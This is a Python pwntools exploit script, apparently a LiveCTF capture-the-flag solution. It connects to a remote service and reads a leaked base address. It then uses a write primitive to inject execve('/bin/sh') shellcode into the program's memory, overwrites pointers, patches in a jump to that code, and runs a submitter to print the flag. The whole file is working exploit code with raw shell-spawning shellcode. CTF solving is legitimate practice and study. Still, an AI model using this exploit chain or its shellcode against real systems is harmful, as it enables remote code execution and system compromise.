from pwn import *

context(os='linux', arch='amd64')


def write_u64(ptr, val=0):
    r.send(p64(ptr))
    if ptr != 0:
        r.send(p64(val))


def write_bytes(ptr, b):
    b += b'\x90'*(8-len(b) % 8)
    for i in range(0, len(b), 8):
        write_u64(ptr+i, u64(b[i:i+8]))

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

r = remote(HOST, int(PORT))
base = u64(r.recv(8))

# write_u64(base+0x4000, 0x88888888)
# write_bytes(base+0x4000, b'123456789abcdefgsdf1')

shellcode = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
write_bytes(base+0x4000, shellcode)
# gdb.attach('b *$rebase()')
write_u64(base+0x4330, base+0x1370)
write_u64(base+0x4338, base+0x2000)


# write_u64(base+0x4330, base+0x4000)
# print(r.readmem(base+0x4000, 0x20))
write_u64(0)
r.send(p32(0))

write_bytes(base+0x2000, shellcode)
write_bytes(base+0x2140, bytes.fromhex('E9 BB FE FF FF'))
_base = u64(r.recv(8))

write_u64(0)
r.sendline(b"./submitter")
r.recvuntil(b"Flag: ")
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)             
